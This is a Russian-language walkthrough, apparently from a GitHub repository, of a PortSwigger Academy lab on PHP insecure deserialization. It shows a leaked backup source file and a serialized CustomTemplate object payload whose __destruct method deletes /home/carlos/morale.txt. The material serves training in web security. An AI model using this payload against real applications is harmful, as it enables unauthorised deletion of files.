залогинимся под `wiener:peter`

Нажмем `ПКМ` -> `inspect` и посмотрим содержимое страницы

увидим в разметке следующий комментарий
```
<!-- TODO: Refactor once /libs/CustomTemplate.php is updated -->
```

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/19.%20Insecure%20deserialization/4.%20Arbitrary%20object%20injection%20in%20PHP/pics%20for%20walkthrough/1.png)

Обратимся к данному файлу через Burp Suite
```
GET /libs/CustomTemplate.php~
```
и увидим его содержимое 


```
<?php

class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
        $this->lock_file_path = $template_file_path . ".lock";
    }

    private function isTemplateLocked() {
        return file_exists($this->lock_file_path);
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lock_file_path, "") === false) {
                throw new Exception("Could not write to " . $this->lock_file_path);
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}

?>
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/19.%20Insecure%20deserialization/4.%20Arbitrary%20object%20injection%20in%20PHP/pics%20for%20walkthrough/2.png)

При анализе кода нас тут интересует следующая функция
```
function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }

```
Иначе говоря, класс CustomTemplate содержит метод/функцию __destruct(). 
Это вызовет метод unlink() для атрибута lock_file_path, который удалит файл /home/carlos/morale.txt.

Так мы и удалим необходимый файл согласно заданию лабораторной работе

Перейдем в `Proxy` -> `HTTP history` и найдем запрос на корневую страницу и оправим данный запрос в `Repeater`
```
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```
Нажмем `Apply changes`

и получим уведомление об успешно выполненной лабораторной работе

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/19.%20Insecure%20deserialization/4.%20Arbitrary%20object%20injection%20in%20PHP/pics%20for%20walkthrough/3.png)
